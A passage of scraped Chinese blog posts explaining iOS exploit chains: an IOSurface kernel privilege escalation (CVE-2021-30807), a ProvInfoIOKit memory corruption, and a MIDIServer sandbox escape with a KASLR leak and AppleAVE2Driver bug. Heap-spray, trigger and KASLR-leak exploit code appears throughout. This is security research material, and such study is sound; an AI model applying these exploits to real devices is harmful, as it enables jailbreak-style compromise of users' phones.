现在kalloc地图被填满了，每一个超过32768字节的kalloc分配都会直接进入内核地图。这个难题的最后一块是要弄清楚我们要使用什么样的受控缓冲区。可以继续使用OSData缓冲区，但是需要大量的代码来读出、写入或释放它们，这与管道缓冲区不同… 123456789101112131415161718192021222324252627282930static const unsigned int pipesize_blocks[] = {512, 1024, 2048, 4096, 4096 * 2, PIPE_SIZE, PIPE_SIZE * 4 };/* * finds the right size from possible sizes in pipesize_blocks * returns the size which matches max(current,expected) */static intchoose_pipespace(unsigned long current, unsigned long expected){ int i = sizeof(pipesize_blocks) / sizeof(unsigned int) - 1; unsigned long target; /* * assert that we always get an atomic transaction sized pipe buffer, * even if the system pipe buffer high-water mark has been crossed. */ assert(PIPE_BUF == pipesize_blocks[0]); if (expected &gt; current) { target = expected; } else { target = current; } while (i &gt; 0 &amp;&amp; pipesize_blocks[i - 1] &gt; target) { i = i - 1; } return pipesize_blocks[i];} 当你使用管道系统调用创建一个管道时，在你向其写入之前，不会为支持的管道缓冲区分配内存。第一次写入的大小首先决定了管道缓冲区的分配量有多大。这正是select_pipespace的作用，pipesize_blocks列出了可能的分配大小。但PIPE_SIZE是什么？ 123456/* * Pipe buffer size, keep moderate in value, pipes take kva space. */#ifndef PIPE_SIZE#define PIPE_SIZE 16384#endif pipesize_blocks的最后一个int是16384 * 4，即0x10000。因此，我们需要做的就是直接从内核地图中分配一个管道缓冲区，并向它写入0x10000字节。 因此，前面提到的 “可预测的布局”，将仅仅是并排的0x10000字节的IOSurfaceClient数组和管道缓冲区。一旦我们在我们拥有的某个IOSurfaceRootUserClient对象中提高了surface_client_array_capacity，那么无论这个容量对应的IOSurfaceClient数组后面的管道缓冲区是什么，我们都会被控制在越界读取的缓冲区。 为了让0x10000字节的IOSurfaceClient数组和管道缓冲区并排使用，我们所要做的就是释放大量的空间，然后交替分配0x10000字节的IOSurfaceClient数组和管道缓冲区。对于 “大量的空间”，使用锚点分配左侧的16MB。为什么是左边的16MB？实验得出来的。 在第一阶段结束时，锚点分配左侧的16MB将看起来像这样。 Stage 2: 信息泄露除了在偏移量0x40处携带一个指向它所管理的IOSurface对象的指针外，它还在偏移量0x10处携带一个指向拥有该Surface的IOSurfaceRootUserClient对象的指针。我们将在前面显示的IOSurface关系图中给IOSurfaceClient添加这个字段。 大多数IOSurfaceRootUserClient外部方法都遵循这种模式: 从IOSurfaceRootUserClient中读取IOSurfaceClient数组。 用用户空间的IOSurface ID索引到该数组中的一个IOSurfaceClient对象。 将IOSurfaceClient中的IOSurface指针传递给一个为该外部方法做工作的函数。 如果步骤3中的IOSurface指针指向一个IOSurfaceRootUserClient，会怎么样？那些旨在从该Surface返回字段的外部方法会不会无意中泄露该用户客户端的有价值的字段？ 第一阶段在塑造了内核的地址空间之后，实际上还做了一些工作：它将喷射大量的IOSurfaceClient对象，以创建一堆只有这些对象的页面。这样一来，对于一个任意的IOSurface ID，其对应的IOSurfaceClient与其他IOSurfaceClient对象相邻的机会就非常大了。而从现在开始，将把两个相邻的IOSurfaceClient对象称为 “一对”，其中一个在左边，另一个在右边。 现在我们使用重叠策略应用于其中一个对。因为没有办法知道一个surface ID是否会对应于一个对的左边，所以将做一个有根据的猜测。如果猜对了，就会有这样的东西，数组中的蓝色IOSurfaceClient指针指向左边的那个。 我们的想法是让内核在读取左边的IOSurfaceClient时，从左边的IOSurfaceClient的末端读到右边的IOSurfaceClient上。因为我们可以推导出surface客户端数组的地址，因为它与锚点分配器非常接近，我们将通过增加左边数组中的指针来实现这一目的。 offsetof(IOSurfaceClient, IOSurface)是0x40 offsetof(IOSurfaceClient, IOSurfaceRootUserClient) 是0x10 每个IOSurfaceClient对象占用0xa0字节，因为它们住在kext.kalloc.160中。 从左边的surface字段到它所在的kext.kalloc.160元素的末端的距离是0xa0-0x40，或者0x60字节。但这只是与左边的IOSurface字段重叠，只够读取右边的vtable指针的偏移量0x0，所以我们需要一个额外的0x10字节来读取右边的IOSurfaceRootUserClient字段。因此，我们将用32位递增原语将左边的指针递增0x70字节。之后，它将指向左边的一半多一点。 如果我们猜测的表面ID是错误的，那么在这一点上我们很快就会导致Panic，但如果它是正确的，我们现在可以通过使用与左边对应的表面ID从拥有的IOSurfaceRootUserClient中读取字节。对把IOSurfaceRootUserClient的外部方法当作黑匣子来看待，看到了很多乐趣，但没有什么能让准备好在调用IOSurfaceRootUserClient外部方法28，或者IOSurfaceRootUserClient::s_get_bulk_attachments之后，在0x80字节的结构输出中看到的东西。下面是部分内存转储: 123456780x16eea33f8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000x16eea3408: 00 00 00 00 AO 5C A2 CB E4 FF FF FF 00 F8 10 CC0x16eea3418: E4 FF FF FF 01 00 00 00 00 00 00 00 80 B2 7F 9A0x16eea3428: E1 FF FF FF 00 00 00 00 00 00 00 00 28 FB 13 CB0x16eea3438: E4 FF FF FF E0 A4 A4 CC E4 FF FF FF F8 A4 A4 CC0x16eea3448: E4 FF FF FF 00 40 3A E7 E8 FF FF FF 00 20 00 000x16eea3458: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 000x16eea3468: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 该缓冲区包括许多内核指针，但我们感兴趣的是指向: 一个IOSurfaceRoot对象，在偏移量0x1c。 一个我们拥有的IOSurfaceRootUserClient对象，在偏移量0x3c。 属于IOSurfaceRootUserClient的IOSurfaceClient数组，在偏移量0x54。 该数组的容量（除以sizeof(IOSurfaceClient *)）也在偏移量0x5c。 唯一的问题是IOSurfaceRootUserClient指针移位了0xf8字节，但这很简单，从它那里减去0xf8就可以得到原始指针。 Stage 3: iOS14.7一个简单技巧我们带着指向我们拥有的IOSurfaceRootUserClient对象及其IOSurfaceClient数组的指针进入第三阶段。但这不是普通的IOSurfaceClient数组–它是我们在第1阶段喷出的一个数组，所以在它旁边会有一个管道缓冲器。虽然我们不确定哪个管道缓冲区就在旁边，但我们可以通过在泄露的IOSurfaceClient数组指针上添加0x10000来得出它的地址。我们在第3阶段做的第一件事是以如下方式设置我们在第1阶段喷涂的所有管道缓冲区。 偏移量0x0包含衍生的管道缓冲区地址，加上8。 偏移量0x8包含一个假的IOSurfaceClient对象。 偏移量0xa8包含一个假的IOSurface对象。 假的IOSurface的偏移量0xc0指向管道缓冲区的某个地方，把它的索引写在包含第一阶段所有喷涂管道的数组中。这样做是为了以后能弄清哪个管道缓冲区里有我们的假对象。 现在所有的管道缓冲区都设置好了，使用32位的增量，将泄露的IOSurfaceRootUserClient对象的容量提高了一个。 为了弄清楚哪个拥有的IOSurfaceRootUserClient被损坏了，在所有的IOSurfaceRootUserClient::get_surface_use_count中循环查看，当调用IOSurfaceRootUserClient::get_surface_use_count的surface ID索引到相邻的管道缓冲区的开始时，除了错误之外，是否得到其他的东西。如果没有错误，就找到了被破坏的那个，四个字节的输出是持有假IOSurfaceClient和IOSurface对象的管道的索引。 现在我们已经控制了一个IOSurface对象，我们可以用第0阶段谈到的外部方法设置任意的内核读写API。 这样，手机就被攻陷了，我们可以开始越狱。 总结这篇文章里的exp不是一个完整的越狱，而且，exp代码也有限制。","link":"/2021/12/06/iOS-LPE-CVE-2021-30807/"},{"title":"iOS ProvInfoIOKitUserClient漏洞","text":"前言这个漏洞是CVE-2019-7287，已在 iOS 12.1.4 中进行了修复，这里是通过对比iOS 12.1.3 和 iOS 12.1.4 内核的差异性，来寻找漏洞点。 经过对比，判断漏洞点应该是在ProvInfoIOKitUserClient::ucGetEncryptedSeedSegment中，下面是iOS12.1.3中的： 下面是iOS12.1.4中的： 可以看到加入了对a2[30]的大小的检查。 ProvInfoIOKitUserClientIOKit 对象ProvInfoIOKit和ProvInfoIOKitUserClient在com.apple.driver.ProvInfoIOKit的驱动程序中实现。无法从运行 iOS 应用程序的普通容器沙箱，创建与驱动程序的连接。漏洞利用需要沙箱逃逸，或者，可以利用具有对该驱动程序的合法访问权限的进程。检查 iOS 12 附带的沙箱配置文件后发现，允许访问此驱动程序的三个守护进程沙箱。这些守护进程沙箱是： findmydeviced mobileactivationd identityserviced 下一步是找出如何从外部调用此函数，此函数通过驱动程序的externalMethod接口直接暴露给用户空间。对ProvInfoIOKitUserClient::getTargetAndMethodForIndex 的检查表明驱动程序为用户空间提供了 6 种不同的外部方法。这些方法是： ucGenerateSeed（混淆名称：fpXqy2dxjQo7） ucGenerateInFieldSeed（混淆名称：afpHseTGo8s） ucExchangeWithHoover（混淆名称：AEWpRs） ucGetEntcryptedSeedSegment ucEncryptSUInfo ucEncryptWithWrapperKey 查看ucEncryptSUInfo和**ucEncryptWithWrapperKey **时会发现，这两个函数也被patch了，都有大小检查。 最终，在未patch之前，代码完全信任了用户传入的参数结构中的大小字段，从而导致内存损坏。 PZ发现的漏洞利用链中，攻击者控制struct_in的内容： 12345ProvInfoIOKitUserClient::ucEncryptSUInfo(char* struct_in, char* struct_out){ memmove(&amp;struct_out[4], &amp;struct_in[4], *(uint32_t*)&amp;struct_in[0x7d4]);","link":"/2021/12/22/iOS-ProvInfoIOKitUserClient%E6%BC%8F%E6%B4%9E/"},{"title":"iOS RCE: CVE-2019-8797,CVE-2019-8795,CVE-2019-8794","text":"概述这三个漏洞是在iOS12.3.1中发现的，将这些漏洞进行组合，能够实现在内核中执行代码。 影响范围在iOS 13.2，iPadOS 13.2，macOS Catalina 10.15.1，tvOS 13.2，watchOS 6.1中进行了修复。 沙盒逃逸与内核相反，许多在用户空间中运行的守护进程可以通过默认的应用程序沙箱访问。MIDIServer(com.apple.midiserver)允许应用程序和其他服务与可能连接到设备的MIDI硬件进行交互。 MIDIServer二进制文件本身相当简单，它是一个 stub 二进制文件，它的所有功能实际上都存储在一个库中，该库是共享缓存(CoreMIDI)的一部分：MIDIServer的main函数只是调用MIDIServerRun()函数。 CoreMIDI然后设置两个沙箱可访问的Mach服务，com.apple.midiserver和com.apple.midiserver.io。前者是典型的基于MIG的Mach服务器，它实现了47种方法。然而com.apple.midiserver.io是一个自定义实现，用于在客户端和服务器之间传输IO缓冲区。 IO Mach server主线程： 1234567891011121314151617181920212223242526272829303132333435__int64 MIDIIOThread::Run(MIDIIOThread *this, __int64 a2, __int64 a3, int *a4){ x0 = XMachServer::CreateServerPort(&quot;com.apple.midiserver.io&quot;, 3, this + 140, a4); *(this + 36) = x0; if ( !*(this + 35) ) { server_port = x0; *(this + 137) = 1; while ( 1 ) { bufsz = 4; if ( XServerMachPort::ReceiveMessage(&amp;server_port, &amp;msg_cmd, &amp;msg_buf, &amp;bufsz) || msg_cmd == 3 ) break; ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef(&amp;v10, msg_buf); if ( v12 ) { if ( msg_cmd == 1 ) { ClientProcess::WriteDataAvailable(v12); } else if ( msg_cmd == 2 ) { ClientProcess::EmptiedReadBuffer(v12); } } if ( v10 ) { applesauce::experimental::sync::LockFreeHashTable&lt;unsigned int,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)1&gt;::Lookup::~Lookup(&amp;v11); LOBYTE(v10) = 0; } } x0 = XServerMachPort::~XServerMachPort(&amp;server_port); } return x0;} XServerMachPort::ReceiveMessage使用MACH_RCV_MSG参数调用mach_msg，等待该端口上的消息。这个消息包含一个命令ID和一个长度字段，后面是消息的主体，由ReceiveMessage调用解析。提供了三个命令：命令1将调用ClientProcess::WriteDataAvailable，命令2将调用ClientProcess::EmptiedReadBuffer，命令3将退出Mach服务循环。通过ResolvedOpaqueRef找到传递给ClientProcess调用的v12对象。这个方法将使用消息中提供的4字节缓冲区(对象ID)在哈希表中查找，将对象返回到堆栈上。 这漏洞存在于ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef函数中。 这个方法使用的哈希表实际上包含许多不同类型的对象，而不仅仅是ClientProcess类型的对象。例如，MIDIExternalDeviceCreate和MIDIDeviceAddEntity创建的对象都存储在此哈希表中。 如果进行正确的类型检查，这里就没有问题。但是，实际上，有两种访问此哈希表的方法： BaseOpaqueObject::ResolveOpaqueRef ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef 第一种在_MIDIDeviceAddEntity方法中使用，包含正确的类型检查： 1midi_device = BaseOpaqueObject::ResolveOpaqueRef(&amp;TOpaqueRTTI&lt;MIDIDevice&gt;::sRTTI, device_id); 但是，第二种没有。这意味着，通过不同类型对象的 ID，可以在其中一个ClientProcess调用中导致类型混淆，而该方法需要ClientProcess*类型的对象。 查看EmptiedReadBuffer的调用： 1234567891011121314151617181920212223242526272829; __int64 MIDIIOThread::Run(MIDIIOThread *this)__ZN12MIDIIOThread3RunEv[...]BL __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)__ZN13ClientProcess17EmptiedReadBufferEv STP X20, X19, [SP,#-0x10+var_10]! STP X29, X30, [SP,#0x10+var_s0] ADD X29, SP, #0x10 MOV X19, X0 ADD X0, X0, #0x20 ; this BL __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0); bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)__ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv STP X28, X27, [SP,#-0x10+var_50]! STP X26, X25, [SP,#0x50+var_40] STP X24, X23, [SP,#0x50+var_30] STP X22, X21, [SP,#0x50+var_20] STP X20, X19, [SP,#0x50+var_10] STP X29, X30, [SP,#0x50+var_s0] ADD X29, SP, #0x50 MOV X21, X0 MOV X19, X0 ; x19 = (MIDIIORingBufferWritter *)this LDR X8, [X19,#0x58]! LDR X8, [X8,#0x10] MOV X0, X19 如上所见，EmptiedReadBuffer代码将立即解除类型混淆对象中的两个指针的引用，并将其转移到一个可以被攻击者控制的地址，这个调用看起来是这样：obj→0x78→0x10(obj→0x20)。 漏洞利用为了利用这个漏洞，我们可以将ClientProcess类型与MIDIEntity实例混淆。MIDIEntity的大小为0x78，这表示着对象执行的第一次取消引用将超出内存范围。然后，可以在MIDIEntity对象之后对一些受控制的数据进行对齐，因为我们处于用户态，所以有更好的方法。 MIDIObjectSetDataProperty API调用将把CoreFoundation对象反序列化到MIDIServer的堆中，因此使用这个调用可以喷射大小为0x90的CFData对象。然后利用此漏洞发送两个包含OOL内存描述符的Mach消息，将其映射到静态地址0x29f000000(由于某些原因，需要发送两次该消息，否则将不会立即映射内存，尚不确定原因)，这个内存是一个连续的CoW映射，包含稍后要使用的ROP链，而且重要的是一个位于0x10偏移处的函数指针，将被EmptySecondaryQueue取消引用。 下面的代码将设置CFData对象被加入MIDIServer的堆中： 1234567Prepare_bunch_keys(); // For iterating size_t spraybufsize = 0x90; void *spraybuf = malloc(spraybufsize); for(int i=0; i&lt;spraybufsize; i+=0x8){ *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; // The 0x29f000000 address }CFDataRef spraydata = CFDataCreate(kCFAllocatorDefault, spraybuf, spraybufsize); 堆的构造： 1234567891011121314151617181920212223242526// OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);uint32_t mclient_id = 0;MIDIClientCreate(CFSTR(&quot;&quot;), useless_notify, NULL, &amp;mclient_id);printf(&quot;MIDI Client ID: 0x%xn&quot;, mclient_id);// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);uint32_t mdevice_id = 0;MIDIExternalDeviceCreate(CFSTR(&quot;&quot;), CFSTR(&quot;&quot;), CFSTR(&quot;&quot;), &amp;mdevice_id);printf(&quot;MIDI Device ID: 0x%xn&quot;, mdevice_id);// OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);for (int i = 0; i &lt; 300; i++){ MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); // Each call will unserialize one CFData object of size 0x90 }// Sends 1 OOL descriptor each with the spray memory mapping Send_spray_mem();Send_spray_mem();// OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);// Removes every other property we just addedfor (int i = 0; i &lt; 300; i = i + 2){ MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); // Free's the CFData object, popping holes on the heap } 我们现在分配了150个CFData和150个大小为0x90的空闲空间，全部包含SPRAY_ADDRESS指针。下一步是使用MIDIEntity对象填充其中一个漏洞： 123uint32_t mentity_id = 0;MIDIDeviceAddEntity(mdevice_id, CFSTR(&quot;&quot;), false, 0, 0, &amp;mentity_id);printf(&quot;mentity_id = 0x%xn&quot;, mentity_id); 如果一切按计划进行，那么现在应该在堆上有一块内存，其中第一个0x78字节用有效的MIDIEntity对象填充，剩下的0x18字节用SPRAY_ADDRESS指针填充。 为了触发这个漏洞，我们可以使用MIDIEntity对象ID(mentity_id)调用com.apple.midiserver.io Mach服务： 123// Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)Init_triggerExp_msg(mentity_id);Send_triggerExp_msg(); 它将启动MIDIServer进程中Mach服务线程上的ROP链。 然后根据新对象的ID判断是否触发漏洞： 12345678910111213// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);uint32_t verifysucc_mdevice_id = 0;MIDIExternalDeviceCreate(CFSTR(&quot;&quot;), CFSTR(&quot;&quot;), CFSTR(&quot;&quot;), &amp;verifysucc_mdevice_id);printf(&quot;verify_mdevice_id: 0x%xn&quot;, verifysucc_mdevice_id);if (verifysucc_mdevice_id == mdevice_id + 2) { break;}// We failed, reattempting...printf(&quot;Try againn&quot;);MIDIRestart(); 如果对象不连续，则表示利用失败(守护进程崩溃)，因此可以通过MIDIRestart调用重新启动守护进程，然后可以重新尝试利用漏洞。 这里ROP链的基本思路是在SPRAY_ADDRESS内存映射中的缓冲区上调用objc_release，在这个地址上伪造一个假的Objective-C对象，在这个对象上执行release方法。然后创建一个原始的调用链，目的是打开3个userclients，并挂在mach_msg_receive调用中，以便稍后在收到消息时通过vm_read_overwrite覆盖一些内存，这将在稍后的内核利用中使用。 需要注意的是，对于这种基于ROP的利用方法，A12和更新的处理器需要绕过PAC。 从MIDIServer获取的userclients是AppleSPUProfileDriver、IOSurfaceRoot和AppleAVE2Driver。 使用AppleSPUProfileDriver:攻破内核ASLR通过MIDIServer我们可以访问AppleSPUProfileDriver userclient，这个userclient实现了12个方法，但是我们只对AppleSPUProfileDriverUserClient::extSignalBreak感兴趣。查看伪代码： 1234567891011121314151617181920212223242526__int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this){ __int64 dataQueueLock; // x19 unsigned __int64 v8; // x0 __int64 result; // x0 int v10; // [xsp+8h] [xbp-48h] int v11; // [xsp+Ch] [xbp-44h] __int64 v12; // [xsp+10h] [xbp-40h] __int64 v13; // [xsp+38h] [xbp-18h] dataQueueLock = this-&gt;dataQueueLock; IORecursiveLockLock(this-&gt;dataQueueLock); if ( this-&gt;dataQueue ) { v10 = 0; abs_time = mach_absolute_time(); v12 = AppleSPUProfileDriver::absolutetime_to_sputime(this, abs_time); v11 = OSIncrementAtomic(&amp;this-&gt;atomicCount); (*(*this-&gt;dataQueue + 0x88âˆ‚LL))(); // IOSharedDataQueue::enqueue(&amp;v10, 0x30) } result = IORecursiveLockUnlock(dataQueueLock); return result;} 这个函数通过一个锁，将一些数据写入堆栈上存储的缓冲区，并调用IOSharedDataQueue::enqueue将该数据提交到对立，缓冲区大小为0x30。这里访问堆栈的方式不是很清楚，所以看一下汇编代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061; __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *this)__ZN21AppleSPUProfileDriver16signalBreakGatedEvvar_48 = -0x48var_44 = -0x44var_40 = -0x40var_18 = -0x18var_10 = -0x10var_s0 = 0 PACIBSP SUB SP, SP, #0x60 STP X20, X19, [SP,#0x50+var_10] STP X29, X30, [SP,#0x50+var_s0] ADD X29, SP, #0x50 MOV X20, X0 ADRP X8, #___stack_chk_guard@PAGE NOP LDR X8, [X8,#___stack_chk_guard@PAGEOFF] STUR X8, [X29,#var_18] LDR X19, [X0,#0x30B8] MOV X0, X19 BL _IORecursiveLockLock LDR X8, [X20,#0x90] CBZ X8, branch_exit_stub STR WZR, [SP,#0x50+var_48] BL _mach_absolute_time MOV X1, X0 ; unsigned __int64 MOV X0, X20 ; this BL __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong long) STR X0, [SP,#0x50+var_40] MOV W8, #0x30CC ADD X0, X20, X8 BL _OSIncrementAtomic STR W0, [SP,#0x50+var_44] LDR X0, [X20,#0x90] LDR X8, [X0] LDRAA X9, [X8,#0x90]! MOVK X8, #0x911C,LSL#48 ADD X1, SP, #0x50+var_48 MOV W2, #0x30 BLRAA X9, X8 // Call to IOSharedDataQueue::enqueuebranch_exit_stub ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+38 MOV X0, X19 ; lock BL _IORecursiveLockUnlock LDUR X8, [X29,#var_18] ADRP X9, #___stack_chk_guard@PAGE NOP LDR X9, [X9,#___stack_chk_guard@PAGEOFF] CMP X9, X8 B.NE branch_stack_chk_fail MOV W0, #0 LDP X29, X30, [SP,#0x50+var_s0] LDP X20, X19, [SP,#0x50+var_10] ADD SP, SP, #0x60 RETAB; ---------------------------------------------------------------------------branch_stack_chk_fail ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(void)+9C BL ___stack_chk_fail 可以看到32位值为0保存在var_48中，OSIncrementAtomic调用的结果保存在var_44中，absolutetime_to_sputime的返回值保存在var_40中，但是，还记得为IOSharedDataQueue::enqueue调用提供了0x30大小吗？这意味着任何为初始化的堆栈数据都将泄漏到dataqueue中，虽然dataqueue可能包含泄漏的数据，如果我们不能访问此数据，那将不会对安全产生任何影响。但是IOSharedDataQueue被签名成完全共享。让我们来看下AppleSPUProfileDriverUserClient::clientMemoryForType： 1234567891011121314151617181920212223242526272829303132333435363738394041__int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *this, int type, unsigned int *options, IOMemoryDescriptor **memory){ [...] ret = 0xE00002C2LL; if ( !type ) { memDesc = AppleSPUProfileDriver::copyBuffer(this-&gt;provider); *memory = memDesc; if ( memDesc ) ret = 0LL; else ret = 0xE00002D8LL; } return ret;}__int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *this){ [...] dataQueueLock = this-&gt;dataQueueLock; IORecursiveLockLock(this-&gt;dataQueueLock); memDesc = this-&gt;queueMemDesc; if ( memDesc ) { (*(*memDesc + 0x20LL))(); // OSObject::retain buf = this-&gt;queueMemDesc; } else { buf = 0LL; } IORecursiveLockUnlock(dataQueueLock); return buf;} 因此，通过IOConnectMapMemory64可以将IOShareDataQueue映射到内存描述符中，该描述符包含排队的所有数据，包括泄漏的栈数据，为了确定这个漏洞，我们可以先看一个队列泄漏数据的例子： 123456730 00 00 00 00 00 00 00 78 00 00 80 c0 5a 0c 03 00 00 00 00 00 f0 42 00 e0 ff ff ff 50 b4 d8 3b e0 ff ff ff 80 43 03 11 f0 ff ff ff 00 00 00 00 00 00 00 00 第一个dword是一个IODataQueueEntry结构的size字段(本例为0x30)，该字段位于队列中每个数据块的前面： 1234typedef struct _IODataQueueEntry{ UInt32 size; UInt8 data[4];} IODataQueueEntry; 然后我们第三行中看到OSIncrementAtomic的返回值0x78和absolute_to_sputime的值，数据之后是3个内核指针，它们是从堆栈中泄漏出来的。具体来说，我们对第三个指针0xfffffff011034380感兴趣。根据iPhone 8，iOS 12.4的测试，这个指针总是指向__TEXT段，因此通过计算指针偏移，我们可以推断出内核的偏移。信息泄漏的exploit如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970uint64_t check_memmap_for_kaslr(io_connect_t ioconn){ kern_return_t ret; mach_vm_address_t map_addr = 0; mach_vm_size_t map_size = 0; ret = IOConnectMapMemory64(ioconn, 0, mach_task_self(), &amp;map_addr, &amp;map_size, kIOMapAnywhere); if (ret != KERN_SUCCESS) { printf(&quot;IOConnectMapMemory64 failed: %x %sn&quot;, ret, mach_error_string(ret)); return 0x0; } uint32_t search_val = 0xfffffff0; // Constant value of Kernel code segment higher 32bit addr uint64_t start_addr = map_addr; size_t search_size = map_size; while ((start_addr = (uint64_t)memmem((const void *)start_addr, search_size, &amp;search_val, sizeof(search_val)))) { uint64_t tmpcalc = *(uint64_t *)(start_addr - 4) - INFOLEAK_ADDR; // kaslr offset always be 0x1000 aligned if ((tmpcalc &amp; 0xFFF) == 0x0) { return tmpcalc; } start_addr += sizeof(search_val); search_size = (uint64_t)map_addr + search_size - start_addr; } return 0x0;}mach_vm_offset_t get_kaslr(io_connect_t ioconn){ uint64_t scalarInput = 1; // Allocte a new IOSharedDataQueue // AppleSPUProfileDriverUserClient::extSetEnabledMethod IOConnectCallScalarMethod(ioconn, 0, &amp;scalarInput, 1, NULL, NULL); int kaslr_iter = 0; while (!kaslr) { // AppleSPUProfileDriverUserClient::extSignalBreak // Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack IOConnectCallStructMethod(ioconn, 11, NULL, 0, NULL, NULL); // Map the IOSharedDataQueue and look for the leaked ptr kaslr = check_memmap_for_kaslr(ioconn); if (kaslr_iter++ % 5 == 0) { scalarInput = 0; // AppleSPUProfileDriverUserClient::extSetEnabledMethod IOConnectCallScalarMethod(ioconn, 0, &amp;scalarInput, 1, NULL, NULL); scalarInput = 1; // AppleSPUProfileDriverUserClient::extSetEnabledMethod IOConnectCallScalarMethod(ioconn, 0, &amp;scalarInput, 1, NULL, NULL); } } scalarInput = 0; // AppleSPUProfileDriverUserClient::extSetEnabledMethod IOConnectCallScalarMethod(ioconn, 0, &amp;scalarInput, 1, NULL, NULL); // Shutdown return kaslr;} 攻击内核最后一个漏洞是AppleAVE2Driver中缺少边界检查，AppleAVE2是iOS中的图形驱动程序，在本例中，可通过沙盒逃逸来访问MIDIServer。userclient公开了24个方法，这个漏洞存在于索引7的方法中：_SetSessionSettings，该方法获取一个大小为0x108的输入缓冲区，并通过AppleAVE2Driver::GetIOSurfaceFromCSID方法从输入缓冲区中提供的ID加载IOSurface，最后调用AppleAVE2Driver::Enqueue。具体来说，该方法将加载一个名为InitInfoSurfaceld或InitInfoBuffer的表： 1234567891011121314151617if ( !structIn-&gt;InitInfoSurfaceId ) { goto err; } [...] initInfoSurfaceId = structIn-&gt;InitInfoSurfaceId; if ( initInfoSurfaceId ) { initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(this-&gt;provider, initInfoSurfaceId, this-&gt;task); this-&gt;InitInfoBuffer = initInfoBuffer; if ( initInfoBuffer ) goto LABEL_13; goto err; } 然后AppleAVE2Driver::Enqueue方法将在IOSurface上创建一个IOSurfaceBufferMngr实例： 123456789101112131415161718192021222324252627282930313233343536373839bufferMgr = operator new(0x70uLL); if ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, 0LL, this) ) { goto LABEL_23; } if ( IOSurfaceBufferMngr::CreateBufferFromIOSurface( bufferMgr, service-&gt;InitInfoBuffer, this-&gt;iosurfaceRoot, *&amp;this-&gt;gap8[128], *&amp;this-&gt;gap8[136], 1, 0, 0, 0, 0, *&amp;this-&gt;gap101[39], &quot;InitInfo&quot;, this-&gt;gap3AF[49], 0x1F4u) ) { err = 0xE00002BDLL; v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr); operator delete(v28); return err; } if ( bufferMgr-&gt;size &lt; 0x25DD0 ) { err = 0xE00002BCLL; goto LABEL_27; } buffMgrKernAddr = bufferMgr-&gt;kernelAddress; if ( !buffMgrKernAddr ) { goto LABEL_20; } 考虑到这个缓冲区中的数据(现在映射到buffMgrKernAddr)是由userland控制的，该方法将继续将缓冲区中的大块数据复制到AVEClient*对象中，现在将其命名为currentClient： 1234567891011121314151617181920currentClient-&gt;unsigned2400 = *(buffMgrKernAddr + 2008); memmove(&amp;currentClient-&gt;unsigned2404, buffMgrKernAddr + 2012, 0x2BE4LL); currentClient-&gt;oword5018 = *(buffMgrKernAddr + 13296); currentClient-&gt;oword5008 = *(buffMgrKernAddr + 13280); currentClient-&gt;oword4FF8 = *(buffMgrKernAddr + 13264); currentClient-&gt;oword4FE8 = *(buffMgrKernAddr + 13248); currentClient-&gt;oword5058 = *(buffMgrKernAddr + 13360); currentClient-&gt;memoryInfoCnt2 = *(buffMgrKernAddr + 0x3420); currentClient-&gt;oword5038 = *(buffMgrKernAddr + 13328); currentClient-&gt;oword5028 = *(buffMgrKernAddr + 13312); currentClient-&gt;oword5098 = *(buffMgrKernAddr + 13424); currentClient-&gt;oword5088 = *(buffMgrKernAddr + 13408); currentClient-&gt;oword5078 = *(buffMgrKernAddr + 13392); currentClient-&gt;oword5068 = *(buffMgrKernAddr + 13376); currentClient-&gt;oword50C8 = *(buffMgrKernAddr + 13472); currentClient-&gt;oword50B8 = *(buffMgrKernAddr + 13456); currentClient-&gt;oword50A8 = *(buffMgrKernAddr + 13440); currentClient-&gt;qword50D8 = *(buffMgrKernAddr + 13488); memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, 0x630LL); memmove(&amp;currentClient-&gt;gap1C8C[0x5CC], buffMgrKernAddr + 1584, 0x1A8LL); 通过AppleAVE2DriverUserClient::_ my_close关闭AppleAVE2Driver 